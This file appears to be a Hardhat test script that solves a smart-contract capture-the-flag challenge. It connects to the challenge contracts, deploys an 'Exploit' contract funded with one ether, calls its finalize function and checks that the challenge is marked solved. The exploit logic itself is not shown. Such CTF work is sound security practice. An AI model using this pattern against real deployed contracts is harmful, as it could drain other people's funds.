import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_kuldeep23907, CHALLENGE_kuldeep23907 } from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let proxy: Contract;
let slogan: Contract;
let setup: Contract;
let challenge: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    setup = (await ethers.getContractAt(`contracts/kuldeep23907/Setup.sol:Setup`, SETUP_kuldeep23907)).connect(attacker);
    challenge = (await ethers.getContractAt(`contracts/kuldeep23907/Challenge.sol:Challenge`, CHALLENGE_kuldeep23907)).connect(attacker);
    proxy = (await ethers.getContractAt(`contracts/kuldeep23907/Challenge.sol:Slogan`, await challenge.sloganContract())).connect(attacker);
});

it("prints contract address", async function () {
    expect(await setup.instance()).to.eq(CHALLENGE_kuldeep23907);
});

it("exploit", async () => {
    exploit = await (await ethers.getContractFactory(`contracts/kuldeep23907/Exploit.sol:Exploit`, attacker)).deploy(challenge.address, { value: await ethers.utils.parseEther("1") });
    await exploit.finalize();

    expect(await setup.isSolved()).to.eq(true);
});